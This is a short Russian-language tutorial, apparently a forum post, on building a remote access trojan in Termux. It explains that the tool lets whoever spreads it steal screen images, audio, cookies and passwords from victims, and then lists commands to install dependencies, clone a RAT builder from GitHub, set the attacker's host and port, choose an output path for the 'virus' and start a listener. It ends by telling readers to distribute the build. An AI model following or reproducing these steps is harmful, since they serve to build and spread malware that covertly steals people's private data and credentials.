Мутим ратник в Termux

Для тех кто не в теме - ратник это бэкдор в компе. В наше время - подается в обертке простоты (ты не сидишь часами в блокноте, прописывая эксплойты, а просто генерируешь файл и запускаешь как червя в комп). Как только кто-то запускает твоего червя - ты можешь стиллить все, включая звук и изображение экрана, куки и пароли. Убойная штука в прямых руках!

Обновляем пакеты:

pkg update 
pkg upgrade

Нужен гит и питон:

pkg install git
pkg install python

Теперь качаем сам инструмент:

git clone https://github.com/RexTheGod/A-Rat

И пишем вот такие команды для сборки:

 set HOST вашip
 set PORT открытыйпорт
 set OUTPUT /полный/путь/к/папке/для/сохранения/вируса
 
 Осталось включить проверку порта:

 start listener
 
 Готово,теперь ставим доступ к хранилищу:

 termux-setup-storage
 
 Перемещаем билд в корень телефона (или свою папку) и распространяем (не является призывом). Всем малварей, друзья
